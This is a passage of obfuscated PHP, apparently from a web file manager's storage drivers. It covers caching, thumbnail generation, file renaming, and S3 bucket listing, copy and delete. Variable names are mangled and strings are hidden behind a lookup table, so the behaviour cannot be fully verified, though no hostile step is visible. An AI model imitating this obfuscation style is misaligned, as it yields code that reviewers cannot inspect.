header($_SERVER[ıÚ˜š²İ][175] . $üÖŒôÕ); die; } public function cacheMethod($Í•£ªÊ†, $ê¹öâ‰Ó, $â«™†Î = null) { $ƒŞİš´ =& $_SERVER[ıÚ˜š²İ]; static $Šæ±ìâù = array(); $ùÎô›´õ = $ê¹öâ‰Ó ? ltrim($this->getPathOuter($ê¹öâ‰Ó), $ƒŞİš´[8]) : $ƒŞİš´[12]; $â…ŸÛ½ = $ƒŞİš´[176] . $Í•£ªÊ† . $ƒŞİš´[177] . rtrim($ùÎô›´õ, $ƒŞİš´[8]); if (is_null($Í•£ªÊ†)) { $Šæ±ìâù = array(); return; } if (is_null($ê¹öâ‰Ó)) { foreach ($Šæ±ìâù as $â…ŸÛ½ => $˜º·×‹Æ) { if (!strstr($â…ŸÛ½, $ƒŞİš´[176] . $Í•£ªÊ† . $ƒŞİš´[178])) { continue; } unset($Šæ±ìâù[$â…ŸÛ½]); } return; } if ($â«™†Î === $ƒŞİš´[179]) { unset($Šæ±ìâù[$â…ŸÛ½]); return; } if (!is_null($â«™†Î)) { $Šæ±ìâù[$â…ŸÛ½] = $â«™†Î; return; } $£Ö³ù‡ = isset($Šæ±ìâù[$â…ŸÛ½]) ? $Šæ±ìâù[$â…ŸÛ½] : null; if (!is_null($£Ö³ù‡)) { return $£Ö³ù‡; } $£Ö³ù‡ = $this->{$Í•£ªÊ†}($ê¹öâ‰Ó); $Šæ±ìâù[$â…ŸÛ½] = $£Ö³ù‡; return $£Ö³ù‡; } public function cacheMethodInfoSet($¢ú×©Òµ, $ÛÁĞ†Ğí, $½­ØÑæÇ = false) { $¡ŸšÀ¹« =& $_SERVER[ıÚ˜š²İ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($¡ŸšÀ¹«[180], $¢ú×©Òµ, $ÛÁĞ†Ğí); $this->cacheMethod($¡ŸšÀ¹«[181], $¢ú×©Òµ, $ÛÁĞ†Ğí ? !1 : !0); if (is_array($½­ØÑæÇ)) { $this->cacheMethod($¡ŸšÀ¹«[182], $¢ú×©Òµ, $½­ØÑæÇ); } } public function fileOutImage($ìà×ä¤¾, $—¡™ÙÚï = 250) { $ÆŸ›Ï…á =& $_SERVER[ıÚ˜š²İ]; set_timeout(); if (substr($ìà×ä¤¾, 0, 4) == $ÆŸ›Ï…á[152]) { $this->fileOutLink($ìà×ä¤¾); } $„ß±ÑùĞ = $this->info($ìà×ä¤¾); $ÔàëŠ = !1; $Ëíë›Ã = isset($GLOBALS[$ÆŸ›Ï…á[183]]) ? $GLOBALS[$ÆŸ›Ï…á[183]] : array(); if ($Ëíë›Ã && $Ëíë›Ã[$ÆŸ›Ï…á[184]] == $„ß±ÑùĞ[$ÆŸ›Ï…á[87]]) { $„ß±ÑùĞ = $Ëíë›Ã; $ã³ëÈ¯ = $„ß±ÑùĞ[$ÆŸ›Ï…á[185]]; if ($ã³ëÈ¯ && isset($ã³ëÈ¯[$ÆŸ›Ï…á[186]])) { if ($ã³ëÈ¯[$ÆŸ›Ï…á[186]] <= $—¡™ÙÚï && $ã³ëÈ¯[$ÆŸ›Ï…á[187]] <= $—¡™ÙÚï) { $ÔàëŠ = !0; } } } if ($„ß±ÑùĞ[$ÆŸ›Ï…á[79]] <= 1024 * 50 || $ÔàëŠ || !function_exists($ÆŸ›Ï…á[188]) || $„ß±ÑùĞ[$ÆŸ›Ï…á[169]] == $ÆŸ›Ï…á[189]) { return $this->fileOut($ìà×ä¤¾, !1, $„ß±ÑùĞ[$ÆŸ›Ï…á[32]]); } $øšÛæØ = kodIO::hashPath($„ß±ÑùĞ); $ä›òí• = "\x63\x6f\166\x65\x72\x5f{$øšÛæØ}\x5f{$—¡™ÙÚï}\56\160\156\x67"; $¸è…Î˜ê = IO_PATH_SYSTEM_TEMP . $ÆŸ›Ï…á[190]; $—ëíš˜ = IO::infoFullSimple($¸è…Î˜ê); $Õóôâí = $—ëíš˜ && is_array($—ëíš˜) ? $—ëíš˜[$ÆŸ›Ï…á[87]] : $ÆŸ›Ï…á[12]; if (!$Õóôâí) { $Õóôâí = IO::mkdir($¸è…Î˜ê); } if ($„ß±ÑùĞ[$ÆŸ›Ï…á[191]] == $ÆŸ›Ï…á[192] && isset($„ß±ÑùĞ[$ÆŸ›Ï…á[193]]) && $„ß±ÑùĞ[$ÆŸ›Ï…á[193]] == kodIO::sourceID($Õóôâí)) { $Šš™à“ = $„ß±ÑùĞ[$ÆŸ›Ï…á[194]]; if ($—¡™ÙÚï <= 500) { $œ¯²²ÆÍ = preg_replace($ÆŸ›Ï…á[195], $ÆŸ›Ï…á[196], $„ß±ÑùĞ[$ÆŸ›Ï…á[32]]); $Šš™à“ = IO::fileNameExist($Õóôâí, $œ¯²²ÆÍ); } return IO::fileOut(KodIO::make($Šš™à“), !1, $„ß±ÑùĞ[$ÆŸ›Ï…á[32]]); } $µâÏÒÃè = IO::fileNameExist($Õóôâí, $ä›òí•); if ($µâÏÒÃè) { return IO::fileOut(KodIO::make($µâÏÒÃè), !1, $„ß±ÑùĞ[$ÆŸ›Ï…á[32]]); } if ($—¡™ÙÚï > 1000) { $this->makeImageCover($Õóôâí, $ìà×ä¤¾, $ä›òí•, $—¡™ÙÚï); $this->makeImageCover($Õóôâí, $ìà×ä¤¾, "\143\157\x76\x65\162\x5f{$øšÛæØ}\137\x32\x35\60\56\160\x6e\x67", 250); $µâÏÒÃè = IO::fileNameExist($Õóôâí, $ä›òí•); if ($µâÏÒÃè) { return IO::fileOut(KodIO::make($µâÏÒÃè), !1, $„ß±ÑùĞ[$ÆŸ›Ï…á[32]]); } die; } if (!kodIO::allowCover($„ß±ÑùĞ)) { return $this->fileOut($ìà×ä¤¾, !1, $„ß±ÑùĞ[$ÆŸ›Ï…á[32]]); } $ü£›æä¼ = Cache::get($ä›òí•); if ($ü£›æä¼ == $ÆŸ›Ï…á[197] || $ü£›æä¼ == $ÆŸ›Ï…á[198]) { echo $ü£›æä¼; die; } Cache::set($ä›òí•, $ÆŸ›Ï…á[198], 60); $ÛúÊçíÁ = array($Õóôâí, $„ß±ÑùĞ[$ÆŸ›Ï…á[87]], $ä›òí•, $—¡™ÙÚï); $ĞË×… = $ÆŸ›Ï…á[199] . $„ß±ÑùĞ[$ÆŸ›Ï…á[79]] . $ÆŸ›Ï…á[200] . $ä›òí• . $ÆŸ›Ï…á[201] . $„ß±ÑùĞ[$ÆŸ›Ï…á[32]] . $ÆŸ›Ï…á[202] . $„ß±ÑùĞ[$ÆŸ›Ï…á[87]]; TaskQueue::add($ÆŸ›Ï…á[203], $ÛúÊçíÁ, $ĞË×…, $ä›òí•); } public function makeImageCover($ ŞÖ¤øü, $‰ôàşÃò, $ÌÌ±ºÕá, $Ú İ’) { $’«Á·€€ =& $_SERVER[ıÚ˜š²İ]; if (IO::fileNameExist($ ŞÖ¤øü, $ÌÌ±ºÕá)) { return $’«Á·€€[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $¶âİ‡é = $this->getPathOuter($‰ôàşÃò); $Ûèø½Úş = DATA_THUMB . $ÌÌ±ºÕá; del_file($Ûèø½Úş); $ÜöÄ¿­ = IO::copy($¶âİ‡é, TEMP_FILES, !1, $ÌÌ±ºÕá); if (!@file_exists($ÜöÄ¿­)) { return $’«Á·€€[205]; } ImageThumb::createThumb($ÜöÄ¿­, $Ûèø½Úş, $Ú İ’, $Ú İ’ * 10); if (@file_exists($Ûèø½Úş)) { Cache::remove($ÌÌ±ºÕá); return IO::move($Ûèø½Úş, $ ŞÖ¤øü); } Cache::set($ÌÌ±ºÕá, $’«Á·€€[197], 600); del_file($Ûèø½Úş); return $’«Á·€€[206] . $ÜöÄ¿­ . $’«Á·€€[74]; } public function fileOutImageServer($¹†­°Üá, $í™•©ßØ = 250) { $this->fileOutImage($¹†­°Üá, $í™•©ßØ); } public function fileNameAuto($Õ·Æ¨–¨, $Á´°—Æû, $›ŠùË…ù = REPEAT_RENAME, $İë·½‰ú = false) { $ÜäÄ©ÑĞ =& $_SERVER[ıÚ˜š²İ]; $ãôâÉ÷¶ = $Õ·Æ¨–¨ === $ÜäÄ©ÑĞ[12] ? $Á´°—Æû : rtrim($Õ·Æ¨–¨, $ÜäÄ©ÑĞ[8]) . $ÜäÄ©ÑĞ[8] . $Á´°—Æû; if ($›ŠùË…ù == REPEAT_REPLACE || !$this->exist($ãôâÉ÷¶) || $İë·½‰ú && $›ŠùË…ù != REPEAT_RENAME_FOLDER) { return $Á´°—Æû; } if ($›ŠùË…ù == REPEAT_SKIP) { return !1; } $î¹œÑ… = $ÜäÄ©ÑĞ[10] . get_path_ext($Á´°—Æû); $î¹œÑ… = $î¹œÑ… == $ÜäÄ©ÑĞ[10] || $İë·½‰ú ? $ÜäÄ©ÑĞ[12] : $î¹œÑ…; $ÕÌÇîø = 1; $ã¼Â‘˜« = substr($Á´°—Æû, 0, strlen($Á´°—Æû) - strlen($î¹œÑ…)); $à¢Ú£Š» = $ã¼Â‘˜« . "\x28{$ÕÌÇîø}\51{$î¹œÑ…}"; while ($this->exist(rtrim($Õ·Æ¨–¨, $ÜäÄ©ÑĞ[8]) . $ÜäÄ©ÑĞ[8] . $à¢Ú£Š»)) { $à¢Ú£Š» = $ã¼Â‘˜« . "\x28{$ÕÌÇîø}\51{$î¹œÑ…}"; $ÕÌÇîø++; } return $à¢Ú£Š»; } private function fileNameAutoList($ìœ›¥«, $û›…çÆá, $ÕàâÚ› = false) { $»áÖ±Ã =& $_SERVER[ıÚ˜š²İ]; $È°›»«‘ = $this->listPath($ìœ›¥«, !0); $È°›»«‘ = array_merge($È°›»«‘[$»áÖ±Ã[85]], $È°›»«‘[$»áÖ±Ã[86]]); $¼áÉšÚ’ = array_to_keyvalue($È°›»«‘, $»áÖ±Ã[12], $»áÖ±Ã[32]); $òÕ™¯ÖÚ = $»áÖ±Ã[10] . get_path_ext($û›…çÆá); $òÕ™¯ÖÚ = $òÕ™¯ÖÚ == $»áÖ±Ã[10] || $ÕàâÚ› ? $»áÖ±Ã[12] : $òÕ™¯ÖÚ; $æ¨ÅÂšÊ = substr($û›…çÆá, 0, strlen($û›…çÆá) - strlen($òÕ™¯ÖÚ)); $œ¿ºØõ = $æ¨ÅÂšÊ . "\x28\x30\51{$òÕ™¯ÖÚ}"; for ($·æ¸ª»ˆ = 1; $·æ¸ª»ˆ <= count($¼áÉšÚ’) + 1; $·æ¸ª»ˆ++) { $œ¿ºØõ = $æ¨ÅÂšÊ . "\x28{$·æ¸ª»ˆ}\x29{$òÕ™¯ÖÚ}"; if (!in_array_not_case($œ¿ºØõ, $¼áÉšÚ’)) { return $œ¿ºØõ; } } return $œ¿ºØõ; } public function listAllFiles($äÓ…ÀıÉ, $¼€Ò“İÛ) { $ÉÌŸ•«‰ =& $_SERVER[ıÚ˜š²İ]; if (empty($¼€Ò“İÛ)) { return array(); } $şƒÕ”×« = array_keys($¼€Ò“İÛ); $‚ì£ó‘¤ = array(); $äÓ…ÀıÉ = trim($äÓ…ÀıÉ, $ÉÌŸ•«‰[8]); foreach ($¼€Ò“İÛ as $¤á˜œ¬¶ => $¦Ã”¢ ) { $ŸçÙØŸÊ = ltrim(substr(trim($¤á˜œ¬¶, $ÉÌŸ•«‰[8]), strlen($äÓ…ÀıÉ)), $ÉÌŸ•«‰[8]); if (substr($¤á˜œ¬¶, -1) == $ÉÌŸ•«‰[8]) { $ŸçÙØŸÊ = rtrim($ŸçÙØŸÊ, $ÉÌŸ•«‰[8]) . $ÉÌŸ•«‰[8]; } $‚ì£ó‘¤ = array_merge($‚ì£ó‘¤, $this->slicePath($ŸçÙØŸÊ)); } $€”²µÀ = array(); foreach (array_unique($‚ì£ó‘¤) as $Ã—Ò¿íº) { $ùşÈÂïÔ = array($ÉÌŸ•«‰[87] => $this->getPathOuter($ÉÌŸ•«‰[8] . $äÓ…ÀıÉ . $ÉÌŸ•«‰[8] . $Ã—Ò¿íº), $ÉÌŸ•«‰[78] => 1, $ÉÌŸ•«‰[79] => 0); if (substr($Ã—Ò¿íº, -1) != $ÉÌŸ•«‰[8]) { $ùşÈÂïÔ[$ÉÌŸ•«‰[78]] = 0; $ıÓÃæó = $this->getPath($äÓ…ÀıÉ . $ÉÌŸ•«‰[8] . $Ã—Ò¿íº); if (isset($¼€Ò“İÛ[$ıÓÃæó])) { $§¢²Á§² = $¼€Ò“İÛ[$ıÓÃæó]; if (isset($§¢²Á§²[$ÉÌŸ•«‰[79]])) { $ùşÈÂïÔ[$ÉÌŸ•«‰[79]] = intval($§¢²Á§²[$ÉÌŸ•«‰[79]]); } if (isset($§¢²Á§²[$ÉÌŸ•«‰[207]])) { $ùşÈÂïÔ[$ÉÌŸ•«‰[88]] = intval($§¢²Á§²[$ÉÌŸ•«‰[207]]); } } } $€”²µÀ[] = $ùşÈÂïÔ; } return $€”²µÀ; } public function slicePath($Ã–€Ğ±’) { $‘’ñã©Ò =& $_SERVER[ıÚ˜š²İ]; $Ãë’êù® = explode($‘’ñã©Ò[8], trim($Ã–€Ğ±’, $‘’ñã©Ò[8])); $Ãƒ”æÆê = 0; do { ++$Ãƒ”æÆê; $ºŒÒ˜ÌÚ[] = implode($‘’ñã©Ò[8], array_slice($Ãë’êù®, 0, $Ãƒ”æÆê)) . $‘’ñã©Ò[8]; } while ($Ãƒ”æÆê < count($Ãë’êù®)); $ºŒÒ˜ÌÚ[count($Ãë’êù®) - 1] = $Ã–€Ğ±’; return $ºŒÒ˜ÌÚ; } public function getHost() { $»Ò‹¶¿ï =& $_SERVER[ıÚ˜š²İ]; $…ç•Ôã® = parse_url(trim($this->domain, $»Ò‹¶¿ï[8])); $âÀ²Ñå = isset($…ç•Ôã®[$»Ò‹¶¿ï[208]]) ? $…ç•Ôã®[$»Ò‹¶¿ï[208]] : http_type(); $Áå†úŒ = isset($…ç•Ôã®[$»Ò‹¶¿ï[209]]) ? $…ç•Ôã®[$»Ò‹¶¿ï[209]] : $…ç•Ôã®[$»Ò‹¶¿ï[87]]; if (isset($…ç•Ôã®[$»Ò‹¶¿ï[210]])) { $Áå†úŒ .= $»Ò‹¶¿ï[4] . $…ç•Ôã®[$»Ò‹¶¿ï[210]]; } return $âÀ²Ñå . $»Ò‹¶¿ï[211] . $Áå†úŒ; } public function pathEncode($ôÈ™çäÉ) { $–ÎÊ—ğ =& $_SERVER[ıÚ˜š²İ]; return str_replace($–ÎÊ—ğ[212], $–ÎÊ—ğ[8], rawurlencode($ôÈ™çäÉ)); } public function writeLog($ÙĞ¸ÉÔÁ = '', $´ì¦ŠÍå = false) { $½¾Şàœ† =& $_SERVER[ıÚ˜š²İ]; $á¹óï“ = in_array(ACTION, array($½¾Şàœ†[213], $½¾Şàœ†[214])); if (!$á¹óï“ && !GLOBAL_DEBUG) { return; } $œÂÎÄë“ = $ÙĞ¸ÉÔÁ; static $‰æÚı©á = null; if (!$‰æÚı©á) { $‰æÚı©á = strtoupper($this->getType()); } $ÙĞ¸ÉÔÁ = $‰æÚı©á . $½¾Şàœ†[215] . $ÙĞ¸ÉÔÁ; if ($´ì¦ŠÍå) { $×€Ÿèç = error_get_last(); if ($×€Ÿèç) { $ÙĞ¸ÉÔÁ = array($ÙĞ¸ÉÔÁ, $×€Ÿèç); } } write_log($ÙĞ¸ÉÔÁ, $½¾Şàœ†[216]); if ($á¹óï“) { throw new Exception($œÂÎÄë“); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Ñüä¾€Ì) { set_timeout(); require_once SDK_DIR . $_SERVER[ıÚ˜š²İ][217]; parent::__construct(); $this->_init($Ñüä¾€Ì); } public function _init($éêğÓ±—) { $ú˜¾–Ê’ =& $_SERVER[ıÚ˜š²İ]; $this->config = $éêğÓ±—; foreach ($éêğÓ±— as $‹§‡ì¿ => $Áõ„Ò‚Š) { if (isset($this->{$‹§‡ì¿})) { $this->{$‹§‡ì¿} = $Áõ„Ò‚Š; } } $this->endpoint = $éêğÓ±—[$ú˜¾–Ê’[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $áîõÓ“à = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($áîõÓ“à, 0, 7) == $ú˜¾–Ê’[219]) { $áîõÓ“à = $ú˜¾–Ê’[220] . substr($áîõÓ“à, 7); } $this->client->setEndpoint($áîõÓ“à); if (in_array(ACTION, array($ú˜¾–Ê’[213], $ú˜¾–Ê’[214]))) { $this->client->setExceptions(); } } public function setSignVersion($‚É—Ğî = "\x76\64") { $this->signVer = $‚É—Ğî; $this->client->setSignVersion($‚É—Ğî); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $˜•Àîœ´) { return null; } } public function isBucketCors() { $Ì¹ë á =& $_SERVER[ıÚ˜š²İ]; $êèğ¤©° = $this->getBucketCors(); if (!$êèğ¤©° || !is_array($êèğ¤©°)) { return !1; } if (!is_array($êèğ¤©°[$Ì¹ë á[221]])) { $êèğ¤©°[$Ì¹ë á[221]] = explode($Ì¹ë á[50], $êèğ¤©°[$Ì¹ë á[221]]); } if ($êèğ¤©°[$Ì¹ë á[222]] != $Ì¹ë á[223] || !in_array($Ì¹ë á[223], $êèğ¤©°[$Ì¹ë á[221]])) { return !1; } $ùè»‡— = array_map($Ì¹ë á[224], $êèğ¤©°[$Ì¹ë á[225]]); if (!is_array($ùè»‡—)) { $ùè»‡— = array(); } $ÉŞÚ¤ê™ = array($Ì¹ë á[226], $Ì¹ë á[227], $Ì¹ë á[228], $Ì¹ë á[229], $Ì¹ë á[230]); $¯¨òš™ = array_diff($ÉŞÚ¤ê™, $ùè»‡—); return empty($¯¨òš™); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($«§‹­“, $Î¦ ‘Ñ = '', $ŒÒ¿‡Àí = REPEAT_RENAME) { $‡ –ö = $this->setContent($«§‹­“, $Î¦ ‘Ñ); if ($‡ –ö !== !1) { return $this->getPathOuter($«§‹­“); } return !1; } public function mkdir($Ï¼¡»ÓÏ, $«—ß· = REPEAT_SKIP) { $Œ‚Î€¨¶ =& $_SERVER[ıÚ˜š²İ]; if (empty($Ï¼¡»ÓÏ) && $Ï¼¡»ÓÏ !== $Œ‚Î€¨¶[231]) { return !1; } if ($«—ß· && $this->_isFolder($Ï¼¡»ÓÏ)) { return $this->getPathOuter($Ï¼¡»ÓÏ); } $ˆĞ”Ãñã = $this->setContent($Ï¼¡»ÓÏ, $Œ‚Î€¨¶[12], !0); if ($ˆĞ”Ãñã !== !1) { return $this->getPathOuter($Ï¼¡»ÓÏ); } return !1; } public function copyFile($¬°‡ùî¯, $ í¿øï—, $”˜èã—­ = array()) { $¯ƒË´¯« =& $_SERVER[ıÚ˜š²İ]; $Š¦ç´ = $this->objectMeta($¬°‡ùî¯); if (!$Š¦ç´) { return !1; } if ($Š¦ç´[$¯ƒË´¯«[79]] <= 1024 * 1024 * 200) { $ƒ¸·÷…ù = $this->client->copyObject($this->bucket, $¬°‡ùî¯, $this->bucket, $ í¿øï—, $¯ƒË´¯«[232], $”˜èã—­); } else { $ƒ¸·÷…ù = $this->client->multiCopyObject($this->bucket, $¬°‡ùî¯, $this->bucket, $ í¿øï—, $”˜èã—­); } $ƒ¸·÷…ù = $ƒ¸·÷…ù ? $this->getPathOuter($ í¿øï—) : !1; return $ƒ¸·÷…ù; } public function moveFile($„¨ŞèŒ¹, $à•Š¿ñ’) { if ($this->copyFile($„¨ŞèŒ¹, $à•Š¿ñ’)) { $this->delFile($„¨ŞèŒ¹); return $this->getPathOuter($à•Š¿ñ’); } return !1; } public function delFile($Õ­‘‘„”) { return $this->client->deleteObject($this->bucket, $Õ­‘‘„”); } public function delFolder($ÄáÎ­°Ú) { $æêâ™Ğú =& $_SERVER[ıÚ˜š²İ]; if (!$this->exist($ÄáÎ­°Ú)) { return !0; } $this->listItemCache = !1; $íÏüø’– = $this->fileList($ÄáÎ­°Ú); $this->listItemCache = !0; $ÓÅÛü¿¬ = trim($ÄáÎ­°Ú, $æêâ™Ğú[8]) . $æêâ™Ğú[8]; if (!empty($ÄáÎ­°Ú) && $ÄáÎ­°Ú !== $æêâ™Ğú[231] && !in_array($ÓÅÛü¿¬, $íÏüø’–[$æêâ™Ğú[85]])) { $íÏüø’–[$æêâ™Ğú[85]][] = $ÓÅÛü¿¬; } $•ÛŠ„¤’ = $this->delByBatch($íÏüø’–[$æêâ™Ğú[86]]); if (!$•ÛŠ„¤’) { return !1; } $•ÛŠ„¤’ = $this->delByBatch($íÏüø’–[$æêâ™Ğú[85]]); if (!$•ÛŠ„¤’) { return !1; } return $this->delFile($ÓÅÛü¿¬); } private function delByBatch($Ç¥Ÿ«½ø) { foreach (array_chunk($Ç¥Ÿ«½ø, 1000) as $ç´ëó°ë) { $îø¸Î ® = $this->client->deleteObjects($this->bucket, $ç´ëó°ë); if (!$îø¸Î ®) { return !1; } } return !0; } public function rename($ÚªßôŠ•, $ùé„Ìì) { return $this->renameObject($ÚªßôŠ•, $ùé„Ìì); } public function listPath($ùÕ”™ÏÉ, $¶¼šÖ¯Ø = false) { $áËçùÂ€ =& $_SERVER[ıÚ˜š²İ]; $¾ÙˆÍæû = $this->fileList($ùÕ”™ÏÉ, $áËçùÂ€[8], !0); foreach ($¾ÙˆÍæû[$áËçùÂ€[85]] as $şÑ¡Ú‰‘ => $©ƒæ”) { $¾ÙˆÍæû[$áËçùÂ€[85]][$şÑ¡Ú‰‘] = $this->folderInfo($©ƒæ”, $¶¼šÖ¯Ø, $©ƒæ”); } foreach ($¾ÙˆÍæû[$áËçùÂ€[86]] as $şÑ¡Ú‰‘ => $©ƒæ”) { $¾ÙˆÍæû[$áËçùÂ€[86]][$şÑ¡Ú‰‘] = $this->fileInfo($©ƒæ”[$áËçùÂ€[32]], $¶¼šÖ¯Ø, $©ƒæ”); } return $¾ÙˆÍæû; } protected function infoChildren($‡Ãï§°, &$À¶…Ë‡‹) { $Ù°ã…¿’ =& $_SERVER[ıÚ˜š²İ]; $É­†ÇÜš = $this->fileList($‡Ãï§°, $Ù°ã…¿’[12], !0); $À¶…Ë‡‹[$Ù°ã…¿’[81]] += count($É­†ÇÜš[$Ù°ã…¿’[85]]); $À¶…Ë‡‹[$Ù°ã…¿’[80]] += count($É­†ÇÜš[$Ù°ã…¿’[86]]); foreach ($É­†ÇÜš[$Ù°ã…¿’[86]] as $ƒÇƒÍŒ‚) { if (!$ƒÇƒÍŒ‚ || !$ƒÇƒÍŒ‚[$Ù°ã…¿’[79]]) { continue; } $À¶…Ë‡‹[$Ù°ã…¿’[79]] += $ƒÇƒÍŒ‚[$Ù°ã…¿’[79]]; } } private function fileInfo($µÛè’Ø, $½¿¿¤ªĞ = false, $úé…ò›ƒ = array()) { $èêåæõà =& $_SERVER[ıÚ˜š²İ]; $œæ²¡˜Ë = array($èêåæõà[32] => $this->pathThis($µÛè’Ø), $èêåæõà[87] => $this->getPathOuter($µÛè’Ø), $èêåæõà[33] => $èêåæõà[233], $èêåæõà[169] => $this->ext($µÛè’Ø), $èêåæõà[79] => isset($úé…ò›ƒ[$èêåæõà[79]]) ? $úé…ò›ƒ[$èêåæõà[79]] : 0); if ($½¿¿¤ªĞ) { return $œæ²¡˜Ë; } $œæ²¡˜Ë[$èêåæõà[234]] = $œæ²¡˜Ë[$èêåæõà[88]] = 0; $œæ²¡˜Ë[$èêåæõà[235]] = $œæ²¡˜Ë[$èêåæõà[236]] = !0; if (empty($úé…ò›ƒ)) { $úé…ò›ƒ = $this->objectMeta($µÛè’Ø); if (!$úé…ò›ƒ) { return $œæ²¡˜Ë; } } if (isset($úé…ò›ƒ[$èêåæõà[237]]) && $úé…ò›ƒ[$èêåæõà[237]]) { $œæ²¡˜Ë[$èêåæõà[238]] = $úé…ò›ƒ[$èêåæõà[237]]; } if (isset($úé…ò›ƒ[$èêåæõà[207]])) { $œæ²¡˜Ë[$èêåæõà[88]] = $úé…ò›ƒ[$èêåæõà[207]]; } if (isset($úé…ò›ƒ[$èêåæõà[79]])) { $œæ²¡˜Ë[$èêåæõà[79]] = $úé…ò›ƒ[$èêåæõà[79]]; } return $œæ²¡˜Ë; } private function folderInfo($êÊƒÊÛ, $Òï€µ = false, $ÓÖ¹„á­ = array()) { $ÎğÄßÉá =& $_SERVER[ıÚ˜š²İ]; $Ôçßâ”ª = array($ÎğÄßÉá[32] => $this->pathThis($êÊƒÊÛ), $ÎğÄßÉá[87] => $this->getPathOuter($ÎğÄßÉá[8] . $êÊƒÊÛ), $ÎğÄßÉá[33] => $ÎğÄßÉá[78]); if ($Òï€µ) { return $Ôçßâ”ª; } $Ôçßâ”ª[$ÎğÄßÉá[234]] = $Ôçßâ”ª[$ÎğÄßÉá[88]] = 0; $Ôçßâ”ª[$ÎğÄßÉá[235]] = $Ôçßâ”ª[$ÎğÄßÉá[236]] = !0; if ($êÊƒÊÛ == $ÎğÄßÉá[12]) { return $Ôçßâ”ª; } if (empty($ÓÖ¹„á­)) { $ÓÖ¹„á­ = $this->objectMeta(trim($êÊƒÊÛ, $ÎğÄßÉá[8]) . $ÎğÄßÉá[8]); } if (isset($ÓÖ¹„á­[$ÎğÄßÉá[207]])) { $Ôçßâ”ª[$ÎğÄßÉá[234]] = $ÓÖ¹„á­[$ÎğÄßÉá[207]]; } return $Ôçßâ”ª; } private function fileList($ËôÜòÑ, $¹Æ¿‰ı‹ = '', $àé›ØâÍ = 0) { $ÂÜò²¥– =& $_SERVER[ıÚ˜š²İ]; $Æ‡ü†¥± = rtrim($ËôÜòÑ, $ÂÜò²¥–[8]) . $ÂÜò²¥–[8]; $óªÜË®„ = $this->listObjs($Æ‡ü†¥±, null, null, $¹Æ¿‰ı‹); if (!$óªÜË®„) { return array($ÂÜò²¥–[85] => array(), $ÂÜò²¥–[86] => array()); } $Í¾€úŒ— = $ÑÖ×¾É• = array(); foreach ($óªÜË®„[$ÂÜò²¥–[239]] as $ıòıÄÅÖ) { $éì¿ªùŒ = $ıòıÄÅÖ[$ÂÜò²¥–[32]]; if ($éì¿ªùŒ == $Æ‡ü†¥±) { continue; } $¸Öşõ¨Ú = isset($ıòıÄÅÖ[$ÂÜò²¥–[79]]) ? $ıòıÄÅÖ[$ÂÜò²¥–[79]] : 0; $á¶ó­™¬ = $¸Öşõ¨Ú == 0 && substr($éì¿ªùŒ, strlen($éì¿ªùŒ) - 1, 1) == $ÂÜò²¥–[8] ? !0 : !1; $this->cacheMethodInfoSet($éì¿ªùŒ, $á¶ó­™¬, $ıòıÄÅÖ); if ($á¶ó­™¬) { $Í¾€úŒ—[] = $éì¿ªùŒ; continue; } $ÑÖ×¾É•[] = $àé›ØâÍ ? $ıòıÄÅÖ : $éì¿ªùŒ; } foreach ($óªÜË®„[$ÂÜò²¥–[240]] as $ıòıÄÅÖ) { $Í¾€úŒ—[] = $ıòıÄÅÖ[$ÂÜò²¥–[32]]; $this->cacheMethodInfoSet($ıòıÄÅÖ[$ÂÜò²¥–[32]], !0); } $this->cacheMethodInfoSet($ËôÜòÑ, !0); return array($ÂÜò²¥–[85] => $Í¾€úŒ—, $ÂÜò²¥–[86] => $ÑÖ×¾É•); } private function listObjs($øÉŠ—µø, $¯ÕÚò›÷ = null, $£Ë¨Ñ­º = null, $¥üü™ıò = null) { $ûã¤®Îæ =& $_SERVER[ıÚ˜š²İ]; $øÉŠ—µø = trim($øÉŠ—µø, $ûã¤®Îæ[8]); $ôİÂÖçù = empty($øÉŠ—µø) && $øÉŠ—µø !== $ûã¤®Îæ[231] ? $ûã¤®Îæ[12] : $øÉŠ—µø . $ûã¤®Îæ[8]; return $this->client->getBucket($this->bucket, $ôİÂÖçù, $¯ÕÚò›÷, $£Ë¨Ñ­º, $¥üü™ıò, !0); } public function has($Ş­°ˆ×Ú, $ÖÛÑ×Ğ¸ = false, $Èß = true) { $†ËˆÂ‰ï =& $_SERVER[ıÚ˜š²İ]; $Ş­°ˆ×Ú = trim($Ş­°ˆ×Ú, $†ËˆÂ‰ï[8]); $ä”ĞÚª¦ = empty($Ş­°ˆ×Ú) && $Ş­°ˆ×Ú !== $†ËˆÂ‰ï[231] ? $†ËˆÂ‰ï[12] : $Ş­°ˆ×Ú . $†ËˆÂ‰ï[8]; $ùä®·¦ = null; $‰Ä¼Ø¦û = 500; $„êÕÁÕù = $†ËˆÂ‰ï[8]; $úùİ³ÌŞ = $³”éŒ‚Œ = array(); while (!0) { $Õ×³œÌš = $this->listObjs($Ş­°ˆ×Ú, $ùä®·¦, $‰Ä¼Ø¦û, $„êÕÁÕù); if (!$Õ×³œÌš) { break; } $ùä®·¦ = $Õ×³œÌš[$†ËˆÂ‰ï[241]]; $¼õÙºåü = $Õ×³œÌš[$†ËˆÂ‰ï[239]]; $ÒØŸ²¼ = $Õ×³œÌš[$†ËˆÂ‰ï[240]]; if (empty($¼õÙºåü) && empty($ÒØŸ²¼)) { break; } if (count($¼õÙºåü) == 1 && $¼õÙºåü[0][$†ËˆÂ‰ï[32]] == $ä”ĞÚª¦) { break; } if ($ÖÛÑ×Ğ¸) { if (count($¼õÙºåü)) { $¼õÙºåü = array_column($¼õÙºåü, $†ËˆÂ‰ï[32]); $úùİ³ÌŞ = array_merge($úùİ³ÌŞ, $¼õÙºåü); } if (count($ÒØŸ²¼)) { $ÒØŸ²¼ = array_column($ÒØŸ²¼, $†ËˆÂ‰ï[32]); 